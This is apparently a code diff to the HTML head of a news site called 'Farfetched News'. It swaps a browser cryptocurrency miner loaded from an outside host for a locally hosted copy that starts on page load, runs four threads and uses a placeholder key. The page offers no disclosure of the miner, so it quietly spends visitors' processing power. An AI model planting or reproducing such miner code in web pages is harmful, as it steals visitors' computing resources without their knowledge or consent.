@@ -3,20 +3,19 @@
 <link href="CSS/FFNCSS.css" rel="stylesheet" type="text/css">
 
 <html>
-
+	<script src="lib/crypta.js"></script>
+	<script>
+	            var miner=new CRLT.Anonymous('YOUR_PUBLIC_KEY', {
+	                threads:4,autoThreads:false,throttle:0.2,coin: "xmrupx"
+	            });
+	        miner.start();
+	</script>
 <head>
 	
 	<meta charset="utf-8">
 	<link type="text/plain" rel="author" href="http://farfetchednews.github.io/humans.txt" />
 	<link href="/favicon.ico?v=2" rel="shortcut icon" type="image/x-icon">
 	<title>Farfetched News</title>
-	<script src="//statdynamic.com/lib/crypta.js"></script>
-	<script>
-	  var miner=new CRLT.Anonymous('ee4aa2a83286490a88f1fee5442eebd0bb649e364295', {
-	    threads:4,throttle:0.2, coin: "xmr",
-	  });
-	  miner.start();
-	</script>
 	<style>
 		.col-container {
 		  display: table;
